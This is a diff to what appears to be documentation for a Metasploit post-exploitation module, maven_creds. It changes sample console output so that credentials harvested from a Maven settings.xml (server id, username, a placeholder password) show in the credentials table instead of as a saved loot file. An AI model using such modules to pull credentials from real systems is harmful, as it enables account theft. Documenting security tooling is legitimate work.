@@ -32,14 +32,12 @@ msf post(maven_creds) > run
 [*]     Id: server-nexus
 [*]     Username: deploynexus
 [*]     Password: password
-[+] Saved credentials to /home/user/.msf4/loot/20170814145812_default_127.0.0.1_maven.credential_351922.txt
 
-msf post(maven_creds) > loot
+msf post(maven_creds) > creds
 
-Loot
-====
+Credentials
+===========
 
-host       service  type                name          content     info                                                                           path
-----       -------  ----                ----          -------     ----                                                                           ----
-127.0.0.1           maven.credentials   settings.xml  text/plain  Maven credentials from /home/user/settings.xml and id server-nexus             /home/user/.msf4/loot/20170814145812_default_127.0.0.1_maven.credential_351922.txt
-
+host  origin  service  public          private     realm           private_type
+----  ------  -------  ------          -------     -----           ------------
+                       deploynexus     password    server-nexus    Password
